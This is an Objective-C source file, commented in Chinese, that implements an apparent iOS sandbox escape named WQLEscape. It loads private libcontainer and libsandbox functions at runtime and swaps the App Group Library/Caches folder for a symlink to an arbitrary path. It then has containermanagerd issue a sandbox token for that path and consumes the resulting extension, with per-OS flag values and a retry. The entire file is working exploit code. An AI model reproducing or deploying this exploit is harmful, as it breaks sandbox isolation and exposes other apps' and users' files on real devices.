#import "WQLEscape.h"
#import <dlfcn.h>
#import <stdlib.h>
#import <sys/stat.h>
#import <sys/mount.h>
#import <sys/sysctl.h>

#pragma mark - 私有 API 类型

typedef void  *(*wql_query_create_t)(void);
typedef void   (*wql_query_set_class_t)(void *, uint64_t);
typedef void   (*wql_query_set_group_identifiers_t)(void *, void *);
typedef void   (*wql_query_set_flags_t)(void *, uint64_t);
typedef void   (*wql_query_set_part_t)(void *, uint64_t);
typedef void  *(*wql_query_get_single_result_t)(void *);
typedef void   (*wql_query_free_t)(void *);
typedef char  *(*wql_copy_sandbox_token_t)(void *);
typedef int64_t (*wql_sbx_consume_t)(const char *);
typedef int    (*wql_sbx_release_t)(int64_t);
typedef void  *(*wql_xpc_string_create_t)(const char *);
typedef void   (*wql_xpc_release_t)(void *);

static wql_query_create_t                gQueryCreate    = NULL;
static wql_query_set_class_t             gQuerySetClass  = NULL;
static wql_query_set_group_identifiers_t gQuerySetGroups = NULL;
static wql_query_set_flags_t             gQuerySetFlags  = NULL;
static wql_query_set_part_t              gQuerySetPart   = NULL;
static wql_query_get_single_result_t     gQueryGetSingle = NULL;
static wql_query_free_t                  gQueryFree      = NULL;
static wql_copy_sandbox_token_t          gCopyToken      = NULL;
static wql_sbx_consume_t                 gConsume        = NULL;
static wql_sbx_release_t                 gRelease        = NULL;
static wql_xpc_string_create_t           gXPCString      = NULL;
static wql_xpc_release_t                 gXPCRelease     = NULL;

static NSString *gPrepareError = nil;

// container_query_operation_set_part(query, 3) = Library/Caches
static const uint64_t kPartCaches  = 3;
static const uint64_t kClassAppGrp = 7;
// 两组已知可用的 operation flags；26.x 与 27 需要的是不同的那一组
static const uint64_t kFlagDefault = 0x0000008000000000ULL;
static const uint64_t kFlagAlt     = 0x0000000800000000ULL;

@interface WQLEscape ()
@property (nonatomic, strong) NSRecursiveLock *lock;
- (uint64_t)preferredFlag;
- (NSString *)deviceModel;
- (int64_t)runQueryForGroup:(NSString *)group flags:(uint64_t)flags;
@end

@implementation WQLEscape

+ (instancetype)shared {
    static WQLEscape *s = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        s = [WQLEscape new];
        s.lock = [NSRecursiveLock new];
    });
    return s;
}

#pragma mark - 符号解析

- (BOOL)prepareWithError:(NSString **)error {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        // 1. libcontainer C API（不同版本库名不同，两个都试）
        const char *containerLibs[] = {
            "/usr/lib/system/libsystem_containermanager.dylib",
            "/usr/lib/system/libsystem_container.dylib",
            NULL,
        };
        void *cl = NULL;
        for (int i = 0; containerLibs[i] && !cl; i++) {
            void *h = dlopen(containerLibs[i], RTLD_NOW | RTLD_LOCAL);
            if (!h) continue;
            if (dlsym(h, "container_query_create")) {
                cl = h;
            } else {
                dlclose(h);
            }
        }
        if (cl) {
            gQueryCreate    = (wql_query_create_t)dlsym(cl, "container_query_create");
            gQuerySetClass  = (wql_query_set_class_t)dlsym(cl, "container_query_set_class");
            gQuerySetGroups = (wql_query_set_group_identifiers_t)dlsym(cl, "container_query_set_group_identifiers");
            gQuerySetFlags  = (wql_query_set_flags_t)dlsym(cl, "container_query_operation_set_flags");
            gQuerySetPart   = (wql_query_set_part_t)dlsym(cl, "container_query_operation_set_part");
            gQueryGetSingle = (wql_query_get_single_result_t)dlsym(cl, "container_query_get_single_result");
            gQueryFree      = (wql_query_free_t)dlsym(cl, "container_query_free");
            gCopyToken      = (wql_copy_sandbox_token_t)dlsym(cl, "container_copy_sandbox_token");
        }

        // 2. libsandbox
        const char *sbxLibs[] = {
            "/usr/lib/system/libsystem_sandbox.dylib",
            "/usr/lib/libsandbox.1.dylib",
            "/usr/lib/libSystem.B.dylib",
            NULL,
        };
        for (int i = 0; sbxLibs[i] && !gConsume; i++) {
            void *h = dlopen(sbxLibs[i], RTLD_NOW | RTLD_LOCAL);
            if (!h) continue;
            gConsume = (wql_sbx_consume_t)dlsym(h, "sandbox_extension_consume");
            if (gConsume) {
                gRelease = (wql_sbx_release_t)dlsym(h, "sandbox_extension_release");
            } else {
                dlclose(h);
            }
        }

        // 3. libxpc（只用来造 group identifier 对象）
        void *xl = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW | RTLD_LOCAL);
        void *xh = xl ? xl : RTLD_DEFAULT;
        gXPCString  = (wql_xpc_string_create_t)dlsym(xh, "xpc_string_create");
        gXPCRelease = (wql_xpc_release_t)dlsym(xh, "xpc_release");

        NSMutableArray *missing = [NSMutableArray array];
        if (!gQueryCreate)    [missing addObject:@"container_query_create"];
        if (!gQuerySetClass)  [missing addObject:@"container_query_set_class"];
        if (!gQuerySetGroups) [missing addObject:@"container_query_set_group_identifiers"];
        if (!gQuerySetFlags)  [missing addObject:@"container_query_operation_set_flags"];
        if (!gQuerySetPart)   [missing addObject:@"container_query_operation_set_part"];
        if (!gQueryGetSingle) [missing addObject:@"container_query_get_single_result"];
        if (!gQueryFree)      [missing addObject:@"container_query_free"];
        if (!gCopyToken)      [missing addObject:@"container_copy_sandbox_token"];
        if (!gConsume)        [missing addObject:@"sandbox_extension_consume"];
        if (!gXPCString)      [missing addObject:@"xpc_string_create"];

        if (missing.count) {
            gPrepareError = [NSString stringWithFormat:@"符号缺失: %@",
                             [missing componentsJoinedByString:@", "]];
            ok = NO;
        } else {
            gPrepareError = nil;
            ok = YES;
        }
    });

    if (!ok && error) *error = gPrepareError ?: @"符号解析失败";
    return ok;
}

- (NSString *)groupIdentifier {
    if (_groupIdentifier.length) return _groupIdentifier;
    NSString *v = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"WQLAppGroup"];
    return v;
}

- (NSURL *)groupContainerURL {
    NSString *g = self.groupIdentifier;
    if (!g.length) return nil;
    return [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:g];
}

#pragma mark - 诊断

- (NSDictionary<NSString *, id> *)diagnostics {
    NSOperatingSystemVersion v = [NSProcessInfo processInfo].operatingSystemVersion;
    NSURL *root = [self groupContainerURL];
    NSString *err = nil;
    BOOL symbols = [self prepareWithError:&err];
    return @{
        @"os": [NSString stringWithFormat:@"%ld.%ld.%ld",
                (long)v.majorVersion, (long)v.minorVersion, (long)v.patchVersion],
        @"device": [self deviceModel],
        @"group": self.groupIdentifier ?: @"(未配置)",
        @"groupPath": root.path ?: @"(nil)",
        @"groupOK": @(root != nil),
        @"symbolsOK": @(symbols),
        @"symbolsError": err ?: @"",
        @"flagsFirst": [NSString stringWithFormat:@"0x%llx",
                        (unsigned long long)[self preferredFlag]],
    };
}

- (uint64_t)preferredFlag {
    // 26.x 用 0x800000000；27 用 0x8000000000。猜错会直接 -5，下面会自动换另一组重试。
    NSOperatingSystemVersion v = [NSProcessInfo processInfo].operatingSystemVersion;
    return (v.majorVersion == 26) ? kFlagAlt : kFlagDefault;
}

- (NSString *)deviceModel {
    size_t size = 0;
    if (sysctlbyname("hw.machine", NULL, &size, NULL, 0) != 0 || size == 0) return @"?";
    char *buf = malloc(size);
    if (!buf) return @"?";
    NSString *model = @"?";
    if (sysctlbyname("hw.machine", buf, &size, NULL, 0) == 0) {
        NSString *m = [NSString stringWithUTF8String:buf];
        if (m) model = m;
    }
    free(buf);
    return model;
}

#pragma mark - 核心

- (int64_t)consumeExtensionForPath:(NSString *)path error:(NSString **)error {
    if (!path.length) {
        if (error) *error = @"目标路径为空";
        return WQLStatusTargetMissing;
    }
    if (![self prepareWithError:error]) return WQLStatusSymbolsMissing;

    // 目标必须存在
    struct stat st;
    if (lstat(path.fileSystemRepresentation, &st) != 0) {
        if (error) *error = [NSString stringWithFormat:@"目标不存在: %@", path];
        return WQLStatusTargetMissing;
    }

    NSString *target = path;
    while (target.length > 1 && [target hasSuffix:@"/"]) {
        target = [target substringToIndex:target.length - 1];
    }

    NSString *group = self.groupIdentifier;
    if (!group.length) {
        if (error) *error = @"未配置 App Group";
        return WQLStatusNoGroup;
    }
    NSURL *root = [self groupContainerURL];
    if (!root) {
        if (error) *error = [NSString stringWithFormat:
                             @"App Group 容器不存在: %@（描述文件没带这个 group）", group];
        return WQLStatusNoGroup;
    }
    NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];

    // 符号链接替换是全局状态，必须串行
    [self.lock lock];

    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:caches error:nil];
    NSError *symErr = nil;
    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:&symErr]) {
        [self restoreCaches:caches];
        [self.lock unlock];
        if (error) *error = [NSString stringWithFormat:@"建符号链接失败: %@",
                             symErr.localizedDescription ?: @"unknown"];
        return WQLStatusSymlinkFailed;
    }

    uint64_t first = [self preferredFlag];
    uint64_t second = (first == kFlagAlt) ? kFlagDefault : kFlagAlt;

    int64_t handle = [self runQueryForGroup:group flags:first];
    if (handle == WQLStatusQueryRejected || handle == WQLStatusTokenRefused) {
        int64_t retry = [self runQueryForGroup:group flags:second];
        if (retry > 0) handle = retry;
    }

    [self restoreCaches:caches];
    [self.lock unlock];

    if (handle < 0 && error) {
        *error = [NSString stringWithFormat:@"%@ (target=%@)", [self describeStatus:handle], target];
    }
    return handle;
}

- (int64_t)runQueryForGroup:(NSString *)group flags:(uint64_t)flags {
    void *q = gQueryCreate();
    if (!q) return WQLStatusQueryCreateFailed;

    gQuerySetClass(q, kClassAppGrp);

    // worse_query 原版直接传 xpc_string，不是 xpc_array —— 按原样来
    void *ident = gXPCString ? gXPCString(group.UTF8String) : NULL;
    if (ident) gQuerySetGroups(q, ident);

    gQuerySetPart(q, kPartCaches);
    gQuerySetFlags(q, flags);

    int64_t out = WQLStatusQueryRejected;
    void *result = gQueryGetSingle(q);
    if (result) {
        char *token = gCopyToken(result);
        if (token) {
            int64_t h = gConsume(token);
            free(token);
            out = (h > 0) ? h : WQLStatusTokenRefused;
        } else {
            out = WQLStatusTokenRefused;
        }
    }

    gQueryFree(q);
    if (ident && gXPCRelease) gXPCRelease(ident);
    return out;
}

- (void)restoreCaches:(NSString *)caches {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:caches error:nil];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:NO attributes:nil error:nil];
}

- (void)releaseHandle:(int64_t)handle {
    if (handle > 0 && gRelease) gRelease(handle);
}

- (NSString *)describeStatus:(int64_t)status {
    switch (status) {
        case WQLStatusNoGroup:           return @"App Group 不可用";
        case WQLStatusSymbolsMissing:    return @"私有 API 符号缺失（系统不支持）";
        case WQLStatusQueryCreateFailed: return @"container_query_create 返回 NULL";
        case WQLStatusSymlinkFailed:     return @"符号链接创建失败";
        case WQLStatusQueryRejected:     return @"查询被 containermanagerd 拒绝";
        case WQLStatusTokenRefused:      return @"内核拒绝签发 extension";
        case WQLStatusTargetMissing:     return @"目标不存在";
        default:
            if (status > 0) return [NSString stringWithFormat:@"handle=%lld", (long long)status];
            return [NSString stringWithFormat:@"未知状态 %lld", (long long)status];
    }
}

@end